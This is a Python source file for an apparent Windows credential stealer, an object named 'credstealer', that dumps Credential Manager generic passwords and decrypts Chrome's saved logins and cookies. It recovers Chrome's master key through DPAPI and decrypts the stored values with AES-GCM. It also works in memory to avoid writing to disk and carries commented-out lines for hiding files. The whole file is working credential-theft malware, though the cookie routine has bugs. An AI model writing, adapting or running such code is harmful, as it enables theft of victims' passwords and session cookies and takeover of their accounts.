#!/usr/bin/python

import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred #pywin32
import win32crypt
import win32api
import win32con
import pywintypes
from Crypto.Cipher import AES #pycryptodome
import pprint
import base64


#credentials type(avoid domain credentials,because of LSASS)
CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC

class credentials:
    def dump_credsman_generic(self):
        #functions
        CredEnumerate   = win32cred.CredEnumerate
        CredRead        = win32cred.CredRead

        try:
            creds = CredEnumerate(None,0) #enumerate creds
        except Exception:                 #avoid crashing
            pass

        credentials = [] #credential blob is in hexa and in py octal and hexa formats are not supported by JSON.Use a list a workaround

        for package in creds:
            try:
                target  = package['TargetName']
                creds   = CredRead(target,CRED_TYPE_GENERIC)#clean way
                credentials.append(creds)
            except pywintypes.error:
                pass

        credman_creds = io.StringIO() #in memory text stream to avoid writing file on disk

        for cred in credentials:
            service     = cred['TargetName']
            username    = cred['UserName']
            password    = cred['CredentialBlob'].decode(errors='ignore')


            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')

        return credman_creds.getvalue()


    def get_master_key(self):
        with open(os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Local State',"r",encoding='utf-8')as f:
            local_state = f.read()
            local_state = json.loads(local_state) #open local state data and convert into json
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:] #removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key,None, None, None,0)[1]
        return master_key

    def decrypt_payload(self,cipher,payload):
        return cipher.decrypt(payload)

    def generate_cipher(self,aes_key,iv):
        return AES.new(aes_key,AES.MODE_GCM,iv)


    def decrypt_password(self,buff,master_key):
        try:
            iv              = buff[3:15]
            payload         = buff[15:]
            cipher          = self.generate_cipher(master_key,iv)
            decrypted_pass  = self.decrypt_payload(cipher,payload)
            decrypted_pass  = decrypted_pass[:-16].decode() #remove suffix bytes
            return decrypted_pass
        except Exception as e:
            #print("Probably saved password from Chrome version older than v80\n")
            print(str(e))
            #decrypted_pass= win32crypt.CryptUnprotectData(buff,None,None,None,0)[1]
            return "Chrome < 80"

    def dump_chrome_cookies(self):
        try:
            login_data = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Cookies'
            shutil.copy2(login_data,'./Cookies')
            #win32api.SetFileAttributes('./Cookies',win32con.FILE_ATTRIBUTE_HIDDEN) #hide file
        except Exception:
            pass

        try:
            conn    = sqlite3.connect('./Cookies')
            cursor  = conn.cursor()
            cursor.execute('SELECT host_key,name,value,encrypted_value FROM cookies')
            results = cursor.fetchall()

            master_key = self.get_master_key() #create masterkey

            #decrypt the cookie blobs
            for host_key,name,value,encrypted_value in results:
                decrypted_cookie = decrypt_password(encrypted_value,master_key)

                #Updating the database with decrypted values
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_cookie,host_key,name))

                conn.commit() #save changes
                conn.close()

        except Exception as e:
            print(e)
            pass



    def dump_chrome_logins(self):
        try:
            login_data = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
            shutil.copy2(login_data,'./ChromeLogin') # Copy DB to current dir
            #win32api.SetFileAttributes('./ChromeLogin',win32con.FILE_ATTRIBUTE_HIDDEN) #hide file
        except Exception:
            pass

        chrome_credentials  = io.StringIO() # in memory text stream
        master_key          = self.get_master_key() #create masterkey
        #get data from sqlite3 database
        try:
            conn    = sqlite3.connect('./ChromeLogin')                                      #connect to database
            cursor  = conn.cursor()                                                         #create cursor to fetch data
            cursor.execute('SELECT action_url, username_value, password_value FROM logins') #execute database command
            results = cursor.fetchall()                                                     #get results
            cursor.close()                                                                  #close cursor
            conn.close()                                                                    #close connection (unlock the databse)
            os.remove('./ChromeLogin')                                                      #remove temp file , because content is in results

            for action_url, username_value, password_value in results:
                password = self.decrypt_password(password_value,master_key)

                chrome_credentials.write('URL: ' + action_url + '\n')
                chrome_credentials.write('Username: ' + username_value + '\n')
                chrome_credentials.write('Password: ' + str(password) + '\n')
                chrome_credentials.write('\n')

            return chrome_credentials.getvalue()

        except sqlite3.OperationalError as e:
            print(f"sql error: {e}")
            pass
        except Exception as e:
            print(f"error: {e}")
            pass



if __name__ == '__main__':
    credstealer = credentials()
    #print(credstealer.dump_chrome_logins())
    #print(credstealer.dump_chrome_cookies())
    #print(credstealer.dump_credsman_generic())